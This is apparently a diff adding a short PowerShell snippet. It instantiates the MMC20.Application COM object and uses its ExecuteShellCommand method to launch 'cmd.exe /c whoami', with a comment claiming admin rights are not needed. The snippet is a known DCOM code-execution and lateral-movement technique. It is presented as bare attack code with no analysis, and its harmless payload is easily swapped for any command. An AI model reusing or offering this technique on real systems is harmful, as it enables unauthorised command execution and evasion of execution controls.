@@ -1,0 +1,4 @@
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")
+
+#Admin not needed
